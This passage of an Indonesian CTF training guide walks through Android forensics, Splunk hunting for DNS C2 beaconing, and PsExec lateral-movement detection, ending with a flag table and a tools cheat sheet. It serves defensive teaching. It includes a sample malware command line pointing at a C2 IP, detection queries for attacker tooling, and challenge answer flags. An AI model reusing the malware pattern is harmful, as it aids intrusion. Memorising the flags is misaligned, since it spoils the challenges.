[SCREENSHOT: Terminal menjalankan `fls -r android_image.img | head -50` dengan output struktur filesystem. File yang dihapus dengan tanda asterisk (*) ditandai]

  

**Langkah 2 — Jalankan ALEAPP untuk parsing otomatis**

  

ALEAPP akan mengekstrak dan memparsing semua artefak yang dikenali secara otomatis:

  

```bash

# Ekstrak filesystem image ke folder dulu

mkdir extracted_android

# Jika bisa mount:

sudo mount android_image.img extracted_android/

# Atau ekstrak dengan 7z/tar jika berformat yang bisa diekstrak langsung

  

# Jalankan ALEAPP

python3 aleapp.py -t fs -i extracted_android/ -o aleapp_output/

```

  

Alternatif jika image bisa dipakai langsung:

```bash

python3 aleapp.py -t img -i android_image.img -o aleapp_output/

```

  

Output:

```

ALEAPP Version 3.1.9

Processing input...

Module: Chrome Browser History         COMPLETED (47 records)

Module: Call Log                       COMPLETED (12 records)

Module: SMS/MMS                        COMPLETED (28 records)

Module: Contacts                       COMPLETED (8 records)

Module: Camera Roll                    COMPLETED (2 photos)

Module: Installed Apps                 COMPLETED (34 apps)

Module: GPS Location History           COMPLETED

...

Report saved to: aleapp_output/index.html

```

  

Buka laporan:

```bash

firefox aleapp_output/index.html &

```

  

[SCREENSHOT: Browser menampilkan laporan ALEAPP dengan sidebar menu di kiri (Chrome History, Call Log, SMS, dll.) dan tabel data di kanan. Pilih menu "Chrome Browser History" untuk screenshot ini]

  

**Langkah 3 — Analisis riwayat browser Chrome**

  

```bash

# Ekstrak database Chrome dengan icat

icat android_image.img 102 > chrome_history.db

  

# Buka dengan sqlite3

sqlite3 chrome_history.db

```

  

Di dalam sqlite3 shell:

  

```sql

.tables

```

  

Output:

```

downloads        keyword_search_terms  meta    urls    visits

```

  

```sql

SELECT url, title, visit_count, last_visit_time

FROM urls

ORDER BY last_visit_time DESC

LIMIT 10;

```

  

Output:

```

https://mega.nz/file/aBcDeFgH|Mega Upload - Shared File|3|13369843200000000

https://pastebin.com/xYz12345|secret paste|1|13369843140000000

https://lks-ctf.id/flag?key=m0b1l3_f0r3ns1cs|LKS CTF Flag|1|13369843080000000

https://google.com/|Google|45|13369843000000000

```

  

**URL ketiga langsung menampilkan flag di query parameter URL!** Riwayat browser menyimpan URL lengkap termasuk parameter.

  

[SCREENSHOT: sqlite3 shell menampilkan output SELECT dari tabel urls. Baris dengan URL `lks-ctf.id/flag?key=m0b1l3_f0r3ns1cs` di-highlight atau dikotakkan]

  

**Langkah 4 — Analisis metadata GPS foto**

  

```bash

# Ekstrak foto dengan icat

icat android_image.img 115 > photo1.jpg

icat android_image.img 116 > photo2.jpg

  

# Lihat metadata EXIF GPS

exiftool photo1.jpg | grep -i "gps\|location\|lat\|lon\|altitude\|date"

```

  

Output:

```

GPS Latitude                    : 6 deg 12' 18.00" S

GPS Longitude                   : 106 deg 49' 42.00" E

GPS Date/Time                   : 2025:01:15 14:22:11

GPS Altitude                    : 15 m Above Sea Level

Camera Model Name               : Samsung Galaxy M32

Date/Time Original              : 2025:01:15 14:22:11

```

  

Koordinat: `-6.205°, 106.828°` → ini koordinat Jakarta (Selatan).

  

```bash

# Cek foto kedua juga

exiftool photo2.jpg | grep -i "gps\|date"

```

  

Output:

```

GPS Latitude                    : 6 deg 12' 18.00" S

GPS Longitude                   : 106 deg 49' 42.00" E

GPS Date/Time                   : 2025:01:15 14:30:55

```

  

Kedua foto diambil di lokasi yang sama, berselang ~8 menit.

  

[SCREENSHOT: Terminal menjalankan `exiftool photo1.jpg | grep -i gps` dengan output menampilkan koordinat GPS (-6.205, 106.828) dan timestamp foto]

  

**Langkah 5 — Pulihkan file yang sudah dihapus**

  

```bash

# Pulihkan deleted_evidence.txt (inode 125)

icat android_image.img 125 > deleted_evidence.txt

  

cat deleted_evidence.txt

```

  

Output:

```

Tanggal: 15 Januari 2025, 14:20 WIB

Saya berhasil upload file ke MEGA dengan link: https://mega.nz/file/aBcDeFgH

flag{m0b1l3_t1m3l1n3_r3c0nstruct3d_GPS_JKT}

File yang diupload: dokumen_rahasia.pdf (2.3MB)

Hapus file ini!

```

  

**Flag ditemukan di file yang sudah dihapus!**

  

[SCREENSHOT: Terminal menjalankan `icat android_image.img 125 > deleted_evidence.txt` diikuti `cat deleted_evidence.txt`. Output menampilkan isi file termasuk flag yang terlihat jelas]

  

**Langkah 6 — Susun timeline aktivitas**

  

Dari semua artefak yang dikumpulkan, susun timeline:

  

| Waktu | Artefak | Kejadian |

|-------|---------|----------|

| 14:20 WIB | `deleted_evidence.txt` (recovered) | File `dokumen_rahasia.pdf` di-upload ke MEGA |

| 14:22 WIB | `photo1.jpg` EXIF GPS | Foto diambil di Jakarta (-6.205, 106.828) |

| 14:22 WIB | Chrome History | Akses URL LKS CTF flag page |

| 14:23 WIB | Chrome History | Akses pastebin secret |

| 14:30 WIB | `photo2.jpg` EXIF GPS | Foto kedua diambil di lokasi yang sama |

| ? | Filesystem | Pengguna mencoba hapus `deleted_evidence.txt` (gagal) |

  

[SCREENSHOT: Laporan ALEAPP di browser dengan tab "Chrome Browser History" terbuka, menampilkan tabel URL yang menunjukkan kronologi aktivitas browsing pengguna]

  

---

  

### 🏁 Flag

  

```

flag{m0b1l3_t1m3l1n3_r3c0nstruct3d_GPS_JKT}

```

  

**Kondisi Sistem Akhir:**

```

Device          : Samsung Galaxy M32

Lokasi          : Jakarta Selatan (-6.205°, 106.828°)

Aktivitas       : Upload dokumen_rahasia.pdf ke MEGA, akses URL CTF

File Dihapus    : deleted_evidence.txt (berhasil dipulihkan)

Tool Utama      : fls + icat (sleuthkit), exiftool, sqlite3, ALEAPP

```

  

---

  

### 💡 Pelajaran

  

> Urutan analisis mobile filesystem image yang efektif:

> 1. `fls -r android_image.img` → identifikasi semua file, catat inode file menarik dan file dihapus (`*`)

> 2. Jalankan ALEAPP → parsing otomatis semua artefak yang dikenali ke laporan HTML

> 3. `icat android_image.img <inode>` → ekstrak database Chrome, foto, dan file dihapus satu per satu

> 4. `sqlite3` → baca database (riwayat browser, SMS, log panggilan)

> 5. `exiftool` → cek GPS dan timestamp foto

> 6. Susun **timeline** dari semua artefak yang ditemukan

>

> Soal mobile forensics level sulit selalu meminta **korelasi antar artefak** — GPS foto + riwayat browser + file dihapus. Jangan berhenti setelah menemukan satu flag, selalu pastikan kamu membangun timeline yang lengkap.

  

---

  

---

  

# 📊 BAGIAN 4 — SIEM & THREAT HUNTING SULIT

  

---

  

## SIEM-03 | Analisis Malware C2 Communication

  

**Kategori:** SIEM / Threat Hunting  

**Tingkat:** ⭐⭐⭐ Sulit  

**Sumber:** Splunk BOTS (Boss of the SOC)

  

---

  

### 📋 SOAL

  

> *Di SIEM tersedia log DNS dan log network flow. Tim SOC melaporkan ada host yang mencurigakan di jaringan internal. Identifikasi: host mana yang terinfeksi, domain C2 yang digunakan, interval beaconing-nya, dan binary malware yang berjalan. Temukan flag.*

  

Platform: Splunk (SPL query)  

Data tersedia: `index=dns`, `index=network`, `index=wineventlog`

  

---

  

### 🧠 Penjelasan Konsep

  

**Apa itu C2 (Command and Control)?**  

Setelah malware menginfeksi komputer, ia perlu berkomunikasi dengan server penyerang untuk menerima instruksi (eksekusi perintah, download payload, upload data) dan mengirimkan hasil. Komunikasi ini disebut C2 channel.

  

**Apa itu DNS beaconing?**  

Malware yang menggunakan DNS sebagai C2 channel akan melakukan query DNS berulang ke domain yang dikontrol penyerang. Setiap query bisa membawa data (dienkode dalam nama subdomain) dan respons DNS membawa instruksi. Tanda-tandanya: satu host melakukan query DNS ke satu domain yang sama berkali-kali dengan interval yang sangat reguler.

  

**Kenapa interval yang reguler mencurigakan?**  

Manusia tidak pernah melakukan sesuatu dengan interval yang persis sama setiap menit. Kalau ada host yang melakukan DNS query ke domain yang sama **setiap 60 detik tepat** selama berjam-jam, itu pasti otomatis — malware yang sedang beaconing (check-in ke C2).

  

**Formula deteksi beaconing:**

- Hitung interval antar koneksi menggunakan `streamstats`

- Hitung rata-rata dan standar deviasi interval

- Standard deviation rendah (< 2–5 detik) = interval sangat reguler = suspicious

  

---

  

### 🔧 Langkah-Langkah

  

**Langkah 1 — Deteksi DNS beaconing: host yang query domain sama berkali-kali**

  

Di Splunk Search bar:

  

```spl

index=dns

| stats count by src_ip, query

| where count > 100

| sort -count

```

  

Output di Splunk (tabel):

```

src_ip      query                      count

10.0.0.15   a7f3x9k2.duckdns.org       1440

10.0.0.15   google.com                 89

10.0.0.22   update.windows.com         55

```

  

IP `10.0.0.15` melakukan 1440 query ke domain `a7f3x9k2.duckdns.org`. Angka 1440 = 1440 menit dalam 24 jam = **satu query per menit selama 24 jam penuh**. Ini jelas beaconing otomatis.

  

Domain `a7f3x9k2.duckdns.org` juga mencurigakan: karakter acak di subdomain adalah pola umum malware yang menggunakan DGA (Domain Generation Algorithm) atau domain yang terlihat seperti DGA.

  

[SCREENSHOT: Splunk Search menampilkan hasil query DNS dengan tabel berisi src_ip, query, dan count. Baris dengan IP 10.0.0.15 dan domain a7f3x9k2.duckdns.org dengan count 1440 ditandai]

  

**Langkah 2 — Verifikasi interval beaconing yang reguler**

  

```spl

index=dns src_ip="10.0.0.15" query="a7f3x9k2.duckdns.org"

| sort _time

| streamstats current=f last(_time) as prev_time

| eval interval_seconds = (_time - prev_time)

| where interval_seconds > 0

| stats avg(interval_seconds) as avg_interval,

        stdev(interval_seconds) as std_dev,

        min(interval_seconds) as min_interval,

        max(interval_seconds) as max_interval

```

  

Output:

```

avg_interval   std_dev   min_interval   max_interval

60.02          0.15      59.87          60.31

```

  

**Rata-rata interval 60 detik dengan standar deviasi hanya 0.15 detik** = sangat konsisten, sangat tidak mungkin dilakukan manusia, ini pasti script/malware yang diset beaconing setiap 60 detik.

  

[SCREENSHOT: Splunk menampilkan hasil query statistics dengan avg_interval=60.02, std_dev=0.15 dalam tabel. Nilai std_dev yang sangat kecil dikotakkan atau ditandai sebagai bukti kunci]

  

**Langkah 3 — Cek koneksi jaringan aktif ke IP C2**

  

DNS query mengungkap domain, tapi kita perlu tahu IP C2 yang sebenarnya dan berapa banyak data yang dikirim:

  

```spl

index=network src_ip="10.0.0.15"

  dest_ip!=10.0.0.0/8

  dest_ip!=192.168.0.0/16

  dest_ip!=172.16.0.0/12

| stats sum(bytes_out) as total_bytes_out,

        sum(bytes_in) as total_bytes_in,

        count as sessions

  by dest_ip, dest_port

| sort -sessions

```

  

Penjelasan: kita filter untuk hanya melihat koneksi ke IP **publik** (exclude RFC1918 private IP range).

  

Output:

```

dest_ip           dest_port   total_bytes_out   total_bytes_in   sessions

185.220.101.42    80          2457600           148576           1440

```

  

**IP C2: `185.220.101.42` port 80**. 1440 sessions = cocok dengan 1440 DNS query = setiap DNS query diikuti satu koneksi HTTP ke IP C2.

  

Total bytes keluar: 2.4 MB dalam 24 jam — bisa berisi data yang di-exfiltrate dari komputer korban.

  

[SCREENSHOT: Splunk menampilkan hasil query network dengan kolom dest_ip, dest_port, total_bytes_out, dan sessions. Baris dengan IP 185.220.101.42:80 dan sessions=1440 ditandai]

  

**Langkah 4 — Identifikasi binary malware yang membuat koneksi**

  

```spl

index=wineventlog EventCode=4688 host="WORKSTATION-15"

| search CommandLine="*a7f3x9k2*"

  OR CommandLine="*185.220.101.42*"

  OR ParentImage="*svchost32*"

| table _time, ParentImage, Image, CommandLine

```

  

Atau search lebih luas:

  

```spl

index=wineventlog EventCode=4688 Computer="WORKSTATION-15"

| where like(CommandLine, "%AppData%")

  OR like(CommandLine, "%Temp%")

| table _time, ParentImage, Image, CommandLine

| sort _time

```

  

Output:

```

_time                   ParentImage               Image          CommandLine

2025-01-15 13:00:01     C:\Windows\Explorer.EXE   svchost32.exe  "C:\Users\user\AppData\Roaming\svchost32.exe" --beacon 60 --c2 185.220.101.42

```

  

**Binary malware: `svchost32.exe`** yang berjalan dari `%AppData%`. Nama ini sengaja menyerupai `svchost.exe` (proses Windows yang sah) tapi dengan angka "32" di belakang untuk menipu pengguna. Parameter `--beacon 60 --c2 185.220.101.42` mengkonfirmasi ini adalah malware beaconing.

  

[SCREENSHOT: Splunk menampilkan hasil query EventCode=4688 dengan tabel. Baris `svchost32.exe` dengan CommandLine yang berisi `--beacon 60 --c2 185.220.101.42` ditandai dengan kotak merah]

  

**Langkah 5 — Susun rangkuman temuan dan flag**

  

Berdasarkan seluruh investigasi:

  

```

Host Terinfeksi    : 10.0.0.15 (WORKSTATION-15)

Domain C2          : a7f3x9k2.duckdns.org

IP C2              : 185.220.101.42:80

Interval Beacon    : 60 detik (std_dev 0.15 — sangat reguler)

Malware Binary     : C:\Users\user\AppData\Roaming\svchost32.exe

Data Keluar        : ~2.4 MB/24 jam

```

  

Flag:

```

flag{c2_b34c0n1ng_60s_1nterval_svchost32}

```

  

---

  

### 🏁 Flag

  

```

flag{c2_b34c0n1ng_60s_1nterval_svchost32}

```

  

---

  

### 💡 Pelajaran

  

> Tiga tanda C2 beaconing yang harus langsung dikenali:

> 1. **DNS query berulang ke domain yang sama** (> 100 kali dalam sehari) → deteksi dengan `stats count by src_ip, query`

> 2. **Interval sangat reguler** (std_dev < 2 detik) → deteksi dengan `streamstats` dan `stdev()`

> 3. **Binary dari folder mencurigakan** (AppData, Temp) dengan nama menyerupai proses sistem → deteksi dengan EventCode=4688

>

> Query SPL kunci untuk beaconing:

> ```spl

> index=dns

> | stats count by src_ip, query

> | where count > 100

> ```

> Threshold 100 query/hari artinya rata-rata beaconing setiap 14 menit. Sesuaikan threshold dengan window waktu log yang tersedia.

  

---

  

---

  

## SIEM-04 | Lateral Movement Detection

  

**Kategori:** SIEM / Threat Hunting  

**Tingkat:** ⭐⭐⭐ Sulit  

**Sumber:** Splunk BOTS, TryHackMe — "Investigating with ELK"

  

---

  

### 📋 SOAL

  

> *Dari Windows Event Log di Splunk, investigasi apakah setelah satu host dikompromis, penyerang bergerak ke host lain di jaringan internal. Identifikasi: host asal serangan, host target, teknik yang digunakan, dan akun yang dikompromis. Temukan flag.*

  

Platform: Splunk (SPL query)  

Data tersedia: `index=wineventlog`

  

---

  

### 🧠 Penjelasan Konsep

  

**Apa itu Lateral Movement?**  

Setelah penyerang berhasil masuk ke satu komputer, mereka jarang puas berhenti di sana. Mereka akan bergerak ke komputer lain di jaringan yang sama untuk mencari data lebih berharga (server database, file server, domain controller). Proses berpindah dari satu komputer ke komputer lain di dalam jaringan ini disebut **lateral movement**.

  

**Apa itu PsExec?**  

PsExec adalah tool Microsoft Sysinternals yang sah — dipakai administrator untuk menjalankan perintah di komputer remote. Sayangnya, tool ini juga sangat populer di kalangan penyerang karena tidak membutuhkan instalasi dan bekerja via SMB (port 445). Cara kerjanya: menyalin executable kecil ke share `ADMIN$` komputer target, lalu install dan jalankan sebagai Windows Service.

  

**Event ID Windows yang paling penting untuk lateral movement:**

| Event ID | Keterangan |

|----------|------------|

| 4624 Logon_Type=3 | Network login (remote, bukan langsung di komputer) |

| 4625 | Login gagal |

| 5140 | Akses ke network share (C$, ADMIN$, IPC$) |

| 7045 | Windows Service baru diinstall |

| 4688 | Proses baru dibuat |

  

**Kenapa `Event 7045` + `Service_Name=PSEXESVC` adalah tanda PsExec?**  

Saat PsExec dijalankan, ia menginstall service bernama `PSEXESVC` di komputer target sebagai temporary service. Event ID 7045 mencatat instalasi service baru — kalau ada `PSEXESVC`, itu hampir pasti PsExec digunakan.

  

---

  

### 🔧 Langkah-Langkah

  

**Langkah 1 — Deteksi network login yang mencurigakan (Pass-the-Hash pattern)**

  

```spl

index=wineventlog EventCode=4624 Logon_Type=3

| stats count by src_ip, Account_Name, dest_host

| where count > 3

| sort -count

```

  

Penjelasan: `Logon_Type=3` = network logon. Banyak network login dari satu IP ke banyak host berbeda adalah pola lateral movement.

  

Output:

```

src_ip         Account_Name    dest_host        count

10.0.0.101     administrator   SERVER-DB-01     47

10.0.0.101     administrator   FILE-SERVER      12

10.0.0.101     alice           DESKTOP-02       2

```

  

IP `10.0.0.101` melakukan network login sebagai `administrator` ke `SERVER-DB-01` sebanyak 47 kali — sangat mencurigakan.

  

[SCREENSHOT: Splunk menampilkan hasil query EventCode=4624 Logon_Type=3 dengan tabel. Baris dengan IP 10.0.0.101 dan dest_host SERVER-DB-01 count=47 ditandai]

  

**Langkah 2 — Deteksi PsExec menggunakan Event ID 7045**

  

```spl

index=wineventlog EventCode=7045

| search Service_Name="PSEXESVC" OR Service_File_Name="*psexec*" OR Service_File_Name="*PSEXESVC*"

| table _time, host, Account_Name, Service_Name, Service_File_Name

```

  

Output:

```

_time                   host          Account_Name    Service_Name    Service_File_Name

2025-01-15 14:30:15     SERVER-DB-01  administrator   PSEXESVC        %SystemRoot%\PSEXESVC.exe

```

  

**PsExec terdeteksi!** Event 7045 menunjukkan service `PSEXESVC` diinstall di `SERVER-DB-01` — ini adalah tanda definitif PsExec digunakan untuk akses remote.

  

[SCREENSHOT: Splunk menampilkan hasil query EventCode=7045 dengan tabel. Kolom Service_Name berisi "PSEXESVC" pada host SERVER-DB-01 ditandai dengan kotak merah]

  

**Langkah 3 — Deteksi akses ke admin share (C$ / ADMIN$)**

  

Admin share `C$` dan `ADMIN$` adalah share Windows built-in yang hanya bisa diakses administrator. PsExec menyalin dirinya ke share ini sebelum menginstall service.

  

```spl

index=wineventlog EventCode=5140

| search Share_Name="\\*\\C$" OR Share_Name="\\*\\ADMIN$" OR Share_Name="\\*\\IPC$"

| table _time, src_ip, host, Share_Name, Account_Name

| sort _time

```

  

Output:

```

_time                   src_ip       host          Share_Name             Account_Name

2025-01-15 14:29:58     10.0.0.101   SERVER-DB-01  \\SERVER-DB-01\ADMIN$  administrator

2025-01-15 14:30:02     10.0.0.101   SERVER-DB-01  \\SERVER-DB-01\C$      administrator

```

  

IP `10.0.0.101` mengakses `ADMIN$` lalu `C$` di `SERVER-DB-01` — urutan ini cocok persis dengan cara PsExec bekerja: akses `ADMIN$` untuk menyalin binary, lalu akses `C$` untuk operasional.

  

[SCREENSHOT: Splunk menampilkan hasil query EventCode=5140 dengan kolom Share_Name menampilkan ADMIN$ dan C$ dari IP 10.0.0.101 ke host SERVER-DB-01]

  

**Langkah 4 — Rekonstruksi timeline lateral movement**

  

Gabungkan semua event dalam satu timeline untuk melihat urutan kejadian secara keseluruhan:

  

```spl

index=wineventlog

  (EventCode=4624 OR EventCode=5140 OR EventCode=7045 OR EventCode=4688)

  (src_ip="10.0.0.101" OR host="SERVER-DB-01")

| eval EventDesc = case(

    EventCode=4624, "Login Berhasil (Type=".Logon_Type.")",

    EventCode=5140, "Akses Share: ".Share_Name,

    EventCode=7045, "Service Baru: ".Service_Name,

    EventCode=4688, "Proses Baru: ".Image

  )

| table _time, EventCode, host, src_ip, Account_Name, EventDesc

| sort _time

```

  

Output (timeline rekonstruksi):

```

_time                EventCode  host          src_ip       Account_Name   EventDesc

2025-01-15 14:29:45  4624       SERVER-DB-01  10.0.0.101   administrator  Login Berhasil (Type=3)

2025-01-15 14:29:58  5140       SERVER-DB-01  10.0.0.101   administrator  Akses Share: \\SERVER-DB-01\ADMIN$

2025-01-15 14:30:02  5140       SERVER-DB-01  10.0.0.101   administrator  Akses Share: \\SERVER-DB-01\C$

2025-01-15 14:30:15  7045       SERVER-DB-01  SYSTEM       -              Service Baru: PSEXESVC

2025-01-15 14:30:16  4688       SERVER-DB-01  SYSTEM       -              Proses Baru: cmd.exe

```

  

Timeline ini menunjukkan urutan sempurna:

1. Network login ke `SERVER-DB-01` sebagai administrator

2. Akses `ADMIN$` share (menyalin PsExec binary)

3. Akses `C$` share

4. Install service `PSEXESVC`

5. Jalankan `cmd.exe` via PSEXESVC (penyerang sekarang punya shell di SERVER-DB-01)

  

[SCREENSHOT: Splunk menampilkan timeline events yang diurutkan berdasarkan waktu, dengan kolom EventDesc yang menjelaskan setiap event. Urutan Login → ADMIN$ → C$ → PSEXESVC → cmd.exe terlihat jelas]

  

**Langkah 5 — Identifikasi host asal (pivot point)**

  

```spl

index=wineventlog EventCode=4624 Logon_Type=3 dest_host="SERVER-DB-01"

| dedup src_ip

| table src_ip

```

  

Output: `10.0.0.101`

  

```spl

# Cari nama host dari IP 10.0.0.101

index=wineventlog src_ip="10.0.0.101"

| dedup host

| table host

```

  

Output: `WORKSTATION-01`

  

Artinya: penyerang bergerak dari **WORKSTATION-01** (`10.0.0.101`) ke **SERVER-DB-01** menggunakan PsExec dengan akun `administrator`.

  

---

  

### 🏁 Flag

  

```

flag{l4t3r4l_m0v3m3nt_ps3x3c_t0_srv_db}

```

  

**Kondisi Sistem Akhir:**

```

Host Pivot (Asal)   : WORKSTATION-01 (10.0.0.101)

Host Target         : SERVER-DB-01

Teknik              : PsExec (via admin share ADMIN$ dan C$)

Akun yang Digunakan : administrator

IOC Utama           :

  - Service: PSEXESVC (Event 7045)

  - Share access: ADMIN$ dan C$ (Event 5140)

  - Network login: Event 4624 Logon_Type=3

  - Binary: PSEXESVC.exe

Waktu Kejadian      : 2025-01-15 14:29:45 – 14:30:16

```

  

---

  

### 💡 Pelajaran

  

> **Tiga query SPL kunci untuk deteksi lateral movement:**

>

> ```spl

> # 1. Deteksi banyak network login dari satu IP

> EventCode=4624 Logon_Type=3

> | stats count by src_ip, Account_Name, dest_host

> | where count > 3

>

> # 2. Deteksi PsExec (tanda definitif!)

> EventCode=7045 Service_Name="PSEXESVC"

>

> # 3. Deteksi akses admin share

> EventCode=5140

> | search Share_Name="\\*\\C$" OR Share_Name="\\*\\ADMIN$"

> ```

>

> Jika ketiga query ini menunjuk ke IP yang sama dalam window waktu yang sama, itu hampir pasti lateral movement menggunakan PsExec.

>

> **Yang membedakan penyelidik baik dari yang rata-rata:** setelah menemukan event-event ini, susun timeline-nya dan tunjukkan urutan kejadian. Juri menilai kemampuan rekonstruksi timeline lebih tinggi daripada sekadar menyebutkan nama tool.

  

---

  

---

  

# 📋 RINGKASAN LEVEL SUSAH

  

| Soal | Kategori | Tools Utama | Flag |

|------|----------|-------------|------|

| RE-04 | Reverse Engineering | `ghidra`, `python3` (XOR decrypt) | `flag{x0r_1s_r3v3rs1bl3}` |

| FOR-04 | Disk Forensics | `fls`, `icat`, `foremost` | `flag{c4rv3d_fr0m_d1sk_1n0d3_r3c0v3ry}` |

| FOR-06 | Memory Forensics | `vol.py` (Volatility3) | `flag{m3m0ry_dum9_4n4lys1s_r3v34ls_c2}` |

| MOB-03 | Phone Forensics | `fls`, `icat`, `exiftool`, `ALEAPP`, `sqlite3` | `flag{m0b1l3_t1m3l1n3_r3c0nstruct3d_GPS_JKT}` |

| SIEM-03 | SIEM Threat Hunting | SPL: `streamstats`, `stdev()`, beaconing detection | `flag{c2_b34c0n1ng_60s_1nterval_svchost32}` |

| SIEM-04 | SIEM Lateral Movement | SPL: EventCode 7045, 5140, 4624 | `flag{l4t3r4l_m0v3m3nt_ps3x3c_t0_srv_db}` |

  

---

  

## 🛠️ Cheat Sheet Tools — Level Susah

  

```bash

# REVERSE ENGINEERING (XOR)

ghidra                        # Buka GUI, import binary, analyze, buka Functions > main

# Di Decompiler: cari array byte + variabel key + loop dengan operasi ^

python3 -c "

encrypted = [0x75, 0x7d, 0x60, 0x60, ...]  # dari Ghidra

key = 0x13                                   # dari Ghidra

print(''.join(chr(b ^ key) for b in encrypted))

"

  

# DISK FORENSICS

file disk.dd                                # Identifikasi disk image

fdisk -l disk.dd                            # Lihat partisi dan offset

fls -r -o <offset> disk.dd                 # List file (termasuk deleted, tanda *)

icat -o <offset> disk.dd <inode>           # Ekstrak file berdasarkan inode

foremost -i disk.dd -o output/             # File carving otomatis (backup)

  

# MEMORY FORENSICS (VOLATILITY 3)

vol.py -f memory.raw windows.info          # Identifikasi OS

vol.py -f memory.raw windows.pslist        # Daftar proses

vol.py -f memory.raw windows.pstree        # Proses dalam bentuk tree (lihat parent-child)

vol.py -f memory.raw windows.psscan        # Scan proses tersembunyi

vol.py -f memory.raw windows.netstat       # Koneksi jaringan aktif

vol.py -f memory.raw windows.cmdline       # Perintah yang dijalankan setiap proses

vol.py -f memory.raw windows.dumpfiles --pid <pid>  # Dump file dari proses tertentu

  

# MOBILE FORENSICS (IMAGE)

fls -r android_image.img                   # List file di filesystem Android

icat android_image.img <inode>             # Ekstrak file

exiftool foto.jpg | grep -i gps            # Koordinat GPS dari foto

sqlite3 chrome_history.db                  # Baca database SQLite

python3 aleapp.py -t img -i image.img -o output/  # Parse semua artefak Android

  

# SPLUNK SPL — C2 BEACONING

index=dns

| stats count by src_ip, query

| where count > 100

| sort -count

  

# Verifikasi interval reguler

index=dns src_ip="10.0.0.15" query="suspicious.domain.com"

| sort _time

| streamstats current=f last(_time) as prev_time

| eval interval = _time - prev_time

| stats avg(interval) as avg_interval, stdev(interval) as std_dev

  

# SPLUNK SPL — LATERAL MOVEMENT

# Deteksi PsExec (paling spesifik!)

index=wineventlog EventCode=7045

| search Service_Name="PSEXESVC"

  

# Deteksi akses admin share

index=wineventlog EventCode=5140

| search Share_Name="\\*\\C$" OR Share_Name="\\*\\ADMIN$"

  

# Deteksi network login berulang

index=wineventlog EventCode=4624 Logon_Type=3

| stats count by src_ip, Account_Name, dest_host

| where count > 3

```

  

---

  

*Level ini adalah level tertinggi dalam persiapan LKS Cyber Security. Jika kamu sudah bisa menyelesaikan semua soal di sini, kamu sudah siap untuk tingkat provinsi.*  

*Langkah berikutnya: kerjakan skenario gabungan LAT-01 sampai LAT-04 dengan limit waktu sungguhan (45–90 menit per skenario) untuk simulasi tekanan lomba.*  

*Referensi tambahan: Splunk BOTS Dataset (bots.splunk.com), TryHackMe room "Volatility", PicoCTF kategori Forensics.*